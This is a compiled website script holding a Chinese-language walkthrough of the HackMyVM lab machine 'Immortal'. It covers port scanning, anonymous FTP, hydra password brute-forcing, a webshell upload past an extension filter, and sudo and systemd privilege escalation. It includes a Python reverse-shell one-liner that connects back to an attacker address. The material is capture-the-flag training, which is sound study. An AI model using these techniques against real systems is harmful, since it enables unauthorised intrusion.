"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3332],{6738:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>m,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var s=t(74848),a=t(28453);const r={sidebar_position:3,tags:["Easy","Linux","FTP","SSH","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u6587\u4ef6\u4e0a\u4f20","SUDO",".service"],title:"Immortal",description:"Immortal"},o="Immortal",i={id:"box/HackMyVM/Immortal",title:"Immortal",description:"Immortal",source:"@site/docs/box/HackMyVM/Immortal.md",sourceDirName:"box/HackMyVM",slug:"/box/HackMyVM/Immortal",permalink:"/docs/box/HackMyVM/Immortal",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"FTP",permalink:"/docs/tags/ftp"},{label:"SSH",permalink:"/docs/tags/ssh"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"SUDO",permalink:"/docs/tags/sudo"},{label:".service",permalink:"/docs/tags/service"}],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3,tags:["Easy","Linux","FTP","SSH","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u6587\u4ef6\u4e0a\u4f20","SUDO",".service"],title:"Immortal",description:"Immortal"},sidebar:"boxSidebar",previous:{title:"SaveSanta",permalink:"/docs/box/HackMyVM/SaveSanta"},next:{title:"Liceo",permalink:"/docs/box/HackMyVM/Liceo"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"FTP - 21",id:"ftp---21",level:2},{value:"HTTP - 80",id:"http---80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data --&gt; drake",id:"www-data----drake",level:3},{value:"drake --&gt; eric",id:"drake----eric",level:3},{value:"eric --&gt; root",id:"eric----root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",input:"input",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"immortal",children:"Immortal"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# nmap -sTCV -p- --min-rate 1000 192.168.0.102\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 02:18 EDT\nNmap scan report for 192.168.0.102 (192.168.0.102)\nHost is up (0.0022s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             504 Feb 27 22:03 message.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:192.168.0.101\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n|_ftp-bounce: bounce working!\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)\n|   256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)\n|_  256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.56 ((Debian))\n|_http-title: Password\n|_http-server-header: Apache/2.4.56 (Debian)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ftp---21",children:"FTP - 21"}),"\n",(0,s.jsx)(n.p,{children:"\u5f53\u6211\u770b\u89c1 FTP \u7684\u65f6\u5019\u672c\u80fd\u53cd\u5e94\u5c1d\u8bd5 FTP \u533f\u540d\u8eab\u4efd\u767b\u9646, \u53d1\u73b0\u53ef\u4ee5\u767b\u9646\u5e76\u4ece\u5176\u4e2d\u83b7\u53d6\u5230\u4e00\u4e9b\u4fe1\u606f, \u4f46\u662f\u5f88\u53ef\u60dc\u8fd9\u662f\u4e00\u4e2a\u63d0\u793a\u6d88\u606f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# ftp 192.168.0.102\nConnected to 192.168.0.102.\n220 (vsFTPd 3.0.3)\nName (192.168.0.102:root): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||50560|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             504 Feb 27 22:03 message.txt\n\n\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# cat message.txt \nHey guys!\nI made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. \nNow we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. \nThey may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! \nWishing you a long life, David.\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",checked:!0,disabled:!0})," ","\u4ece\u4e2d\u6211\u83b7\u53d6\u5230\u4e00\u4e2a\u7528\u6237\u540d : ",(0,s.jsx)(n.code,{children:"David"})]}),"\n"]})}),"\n",(0,s.jsx)(n.h2,{id:"http---80",children:"HTTP - 80"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412142800.png",alt:""}),"\n\u8bbf\u95ee HTTP \u670d\u52a1, \u6211\u53d1\u73b0\u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u5bc6\u7801\u767b\u9646, \u6211\u4f7f\u7528\u4e86\u76ee\u5f55\u626b\u63cf\u4e5f\u6ca1\u6709\u627e\u89c1, \u6240\u4ee5\u6211\u8ba1\u5212\u4f7f\u7528\u7206\u7834\u624b\u6bb5, \u4e07\u5e78\u7206\u7834\u5230\u4e86"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# hydra -l admin  -P /usr/share/wordlists/rockyou.txt 192.168.0.102 http-post-form "/:password=^PASS^:Incorrect credentials"\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-12 02:27:14\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://192.168.0.102:80/:password=^PASS^:Incorrect credentials\n[80][http-post-form] host: 192.168.0.102   login: admin   password: santiago\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-12 02:27:23\n'})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412142919.png",alt:""}),"\n\u4e4b\u540e\u67e5\u770b\u5176\u4e2d\u7684\u6587\u4ef6, \u5728 chat \u4e2d\u6211\u53d1\u73b0\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u4f4d\u7f6e, \u544a\u8bc9\u4e86\u6211\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u4f4d\u7f6e\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412143047.png",alt:""}),"\n\u76f4\u63a5\u8bbf\u95ee\u8fd9\u4e2a\u5730\u5740, \u7136\u540e\u4e0a\u4f20 ReverseShell, \u4f46\u662f\u5b58\u5728\u8fc7\u6ee4, \u5c1d\u8bd5\u4e86\u5f88\u4e45\u53d1\u73b0\u767d\u540d\u5355\u662f ",(0,s.jsx)(n.code,{children:".phtml"})," , \u4e0a\u4f20\u540e\u968f\u540e\u5728 ",(0,s.jsx)(n.code,{children:"chat"})," \u4e2d\u53d1\u73b0\u4e86\u5bf9\u5e94\u7684 WebShell\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412150912.png",alt:""})]}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data----drake",children:"www-data --\x3e drake"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u7528\u6237 ",(0,s.jsx)(n.code,{children:"drake"})," \u7684\u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u5bc6\u7801\u6587\u4ef6 (\u8fd9\u4e2a\u76ee\u5f55\u6bd4\u8f83\u7279\u6b8a, \u521a\u5f00\u59cb\u90fd\u6ca1\u53d1\u73b0)"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Immortal:/home/drake/...$ cat pass.txt \nnetflix : drake123\namazon : 123drake\nshelldred : shell123dred (f4ns0nly)\nsystem : kevcjnsgii\nbank : myfavouritebank\nnintendo : 123456\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u968f\u540e\u4f7f\u7528\u8fd9\u4e2a\u6784\u9020\u4e00\u4e2a\u5b57\u5178\u5f00\u59cb\u7206\u7834 SSH \u5bc6\u7801\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412153307.png",alt:""})]}),"\n",(0,s.jsx)(n.h3,{id:"drake----eric",children:"drake --\x3e eric"}),"\n",(0,s.jsx)(n.p,{children:"\u767b\u9646\u4e4b\u540e\u53d1\u73b0\u7528\u6237 drake \u5177\u6709\u7279\u6b8a\u6743\u9650, \u5e76\u4e14\u8fd9\u4e2a\u5bf9\u5e94\u7684\u6587\u4ef6\u4e5f\u662f\u6709\u4fee\u6539\u6743\u9650\u7684"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'drake@Immortal:/home$ sudo -l\nMatching Defaults entries for drake on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser drake may run the following commands on Immortal:\n    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py\ndrake@Immortal:/home$ ls -al /opt/immortal.py \n-rw-rw-rw- 1 root root 147 Feb 28 20:20 /opt/immortal.py\ndrake@Immortal:/home$ cat /opt/immortal.py \na = input(str("Do you want to be immortal: "))\n\nif a.lower() == "yes" or a.lower() == "no":\n   print("Bad answer")\nelse:\n   print("Are you sure?")\ndrake@Immortal:/home$\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u76f4\u63a5\u4fee\u6539\u539f py \u6587\u4ef6, \u8ba9\u5176\u4ea7\u751f\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) drake@Immortal:/home$ cat << EOF > /opt/immortal.py \n> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\n> EOF\n(remote) drake@Immortal:/home$ sudo -u eric /usr/bin/python3 /opt/immortal.py\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154018.png",alt:""})}),"\n",(0,s.jsx)(n.h3,{id:"eric----root",children:"eric --\x3e root"}),"\n",(0,s.jsx)(n.p,{children:"\u76f4\u63a5\u67e5\u770b\u7528\u6237\u6743\u9650, \u53d1\u73b0\u8fd9\u4e2a\u7528\u6237\u6743\u9650\u662f\u7ba1\u7406\u4e00\u4e2a\u670d\u52a1, \u76f4\u63a5\u63d0\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) eric@Immortal:/home$ sudo -l\nMatching Defaults entries for eric on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser eric may run the following commands on Immortal:\n    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl start immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl daemon-reload\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154326.png",alt:""}),"\n\u968f\u540e\u76f4\u63a5\u6267\u884c\u5373\u53ef\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154416.png",alt:""})]})]})}function m(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>i});var s=t(96540);const a={},r=s.createContext(a);function o(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);